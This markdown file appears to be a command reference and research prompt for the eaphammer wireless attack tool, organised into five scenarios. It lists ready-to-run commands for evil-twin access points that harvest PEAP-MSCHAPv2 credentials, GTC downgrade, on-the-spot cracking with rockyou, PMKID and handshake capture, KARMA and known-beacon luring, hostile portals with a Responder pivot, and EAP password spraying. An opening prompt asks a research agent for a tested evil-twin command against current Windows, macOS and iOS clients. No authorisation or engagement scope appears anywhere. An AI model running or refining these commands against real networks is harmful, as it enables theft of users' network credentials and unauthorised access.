# eaphammer — command scenarios for deep research

Installed build: eaphammer 1.14.1. Flags come from `help.txt`; `-hh`
(advanced help) exposes additional options not captured here.

## How to invoke

```text
@deep-research Which eaphammer 1.14.1 --negotiate strategy and certificate
configuration reliably capture PEAP-MSCHAPv2 from current Windows/macOS/iOS
supplicants, and which EAP methods reject a self-signed RADIUS certificate?
Cite eaphammer docs, supplicant behaviour notes, and release issues; return a
tested evil-twin command plus a fallback strategy.
```

---

## Scenario 1 — certificates first

| # | Command | How to use |
|---|---------|------------|
| 1 | `sudo eaphammer --bootstrap` | Create a self-signed cert set |
| 2 | `sudo eaphammer --cert-wizard list` | Show active certificates |
| 3 | `sudo eaphammer --cert-wizard create` | Interactive certificate creation |
| 4 | `sudo eaphammer --cert-wizard import` | Import a real cert/key pair |
| 5 | `sudo eaphammer --cert-wizard dh` | Regenerate DH parameters |

**Research questions**
- Which supplicants accept a self-signed cert, and which require a CA chain?
- Does importing a leaked/enterprise cert change client behaviour?

**Sources:** eaphammer wiki, supplicant documentation, test clients.
**Output:** a certificate configuration accepted by the target client.

---

## Scenario 2 — EAP credential capture

| # | Command | How to use |
|---|---------|------------|
| 6 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds` | Basic evil twin |
| 7 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds --negotiate weakest` | Prefer weakest method |
| 8 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds --negotiate gtc-downgrade` | Force GTC where allowed |
| 9 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds --autocrack --wordlist rockyou.txt` | Capture and crack |
| 10 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds --remote-cracking-rig 10.0.0.5:8080` | Offload cracking |
| 11 | `sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds --capture-wpa-handshakes yes` | Also capture handshakes |

**Research questions**
- Which negotiation mode yields MSCHAPv2 without client rejection?
- What is the crack time for a captured challenge-response?

**Sources:** eaphammer wiki, hashcat 5500 benchmarks, client logs.
**Output:** a challenge-response hash and, if cracked, a credential.

---

## Scenario 3 — PSK/PMKID and handshakes

| # | Command | How to use |
|---|---------|------------|
| 12 | `sudo eaphammer -i wlan1 -e "HomeNet" --pmkid` | Clientless PMKID |
| 13 | `sudo eaphammer -i wlan1 -e "HomeNet" --pmkid --psk-capture-file out.pcapng` | Persist capture |
| 14 | `sudo eaphammer -i wlan1 -e "HomeNet" --auth wpa-psk --wpa-passphrase 'test1234'` | Rogue PSK AP |
| 15 | `sudo eaphammer -i wlan1 -e "HomeNet" --auth wpa-psk --capture-wpa-handshakes yes` | Capture handshakes |
| 16 | `sudo eaphammer -i wlan1 -e "HomeNet" --auth wpa-psk --wpa-version 1` | WPA1 compatibility |

**Research questions**
- Which APs return a PMKID to an unassociated client?
- Does `--wpa-version 1` improve client association on legacy devices?

**Sources:** hcxtools PMKID notes, AP behaviour captures.
**Output:** a hashcat-compatible capture.

---

## Scenario 4 — KARMA and known beacons

| # | Command | How to use |
|---|---------|------------|
| 17 | `sudo eaphammer -i wlan1 --karma` | Standard KARMA |
| 18 | `sudo eaphammer -i wlan1 --karma --loud` | Loud KARMA mode |
| 19 | `sudo eaphammer -i wlan1 --karma --known-beacons` | Known-beacons attack |
| 20 | `sudo eaphammer -i wlan1 --karma --known-ssids "CorpNet" "Guest"` | Inline SSID list |
| 21 | `sudo eaphammer -i wlan1 --karma --known-ssids-file ssids.txt` | SSID wordlist |
| 22 | `sudo eaphammer -i wlan1 --karma --ssid-whitelist targets.txt` | Restrict to targets |

**Research questions**
- Do modern devices still probe for hidden SSIDs often enough for KARMA?
- Does loud mode increase association attempts or just detection risk?

**Sources:** KARMA research, device probe captures.
**Output:** association attempts from nearby clients.

---

## Scenario 5 — portals, spraying, and cleanup

| # | Command | How to use |
|---|---------|------------|
| 23 | `sudo eaphammer -i wlan1 -e "Guest" --hostile-portal` | Hostile portal |
| 24 | `sudo eaphammer -i wlan1 -e "Guest" --hostile-portal --pivot` | Portal plus Responder pivot |
| 25 | `sudo eaphammer -i wlan1 -e "Guest" --captive-portal --lport 8080` | Captive portal on 8080 |
| 26 | `sudo eaphammer --list-templates` | List portal templates |
| 27 | `sudo eaphammer -i wlan1 -e "CorpNet" --eap-spray -I wlan1 --user-list users.txt --password 'Winter2026!'` | EAP spray |
| 28 | `sudo eaphammer --cert-wizard dh` | Rotate DH params after testing |

**Research questions**
- Which portal templates are self-contained and which need assets?
- What account-lockout policy does the target domain enforce?

**Sources:** eaphammer wiki, domain policy, portal template source.
**Output:** portal evidence or a spray result set.

## Flag coverage checklist

| Help group | Flags | Scenario |
|------------|-------|----------|
| Modes | `--cert-wizard --list-templates --create-template --delete-template --bootstrap --creds --pmkid --eap-spray --hostile-portal --captive-portal* --debug` | 1–5 |
| AP | `--lhost -i -e -b -c --hw-mode --cloaking --auth --pmf --karma --essid-stripping --mac-* --ssid-*` | 2–4 |
| KARMA | `--loud --known-beacons --known-ssids*` | 4 |
| WPA | `--channel-width --wpa-passphrase --capture-wpa-handshakes --psk-capture-file --auth-alg --wpa-version` | 3 |
| OWE | `--transition-bssid --transition-ssid` | 3 |
| EAP | `--autocrack --negotiate --wordlist --remote-cracking-rig` | 2 |
| Portal | `--lport --payload --portal-template --pivot --add-download-form --dl-form-message --name --description --author` | 5 |
| Spray | `-I --user-list --password` | 5 |

## Scenario index

| Scenario | Commands |
|----------|----------|
| 1 — certificates | 5 |
| 2 — EAP capture | 6 |
| 3 — PSK/PMKID | 5 |
| 4 — KARMA | 6 |
| 5 — portals/spray | 6 |
